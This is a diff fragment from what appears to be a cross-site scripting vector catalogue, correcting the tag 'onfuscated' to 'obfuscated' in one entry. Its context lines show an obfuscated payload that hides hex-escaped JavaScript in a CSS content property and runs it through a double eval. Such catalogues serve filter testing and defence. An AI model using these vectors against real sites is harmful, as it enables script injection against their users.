@@ -1366,7 +1366,7 @@ content: “\61\6c\65\72\74\28\31\29″
 eval(eval(document.styleSheets[0].cssRules[0].style.content))
 </script>
 Exploit Description: This vector utilizes the CSS content property and fetches it off the document.styleSheets property afterwards. For correct execution of the payload a double-eval is needed.
-Exploit Tags: general, onfuscated, style injection
+Exploit Tags: general, obfuscated, style injection
 Author Name: .mario
 
 STYLE w/Anonymous HTML
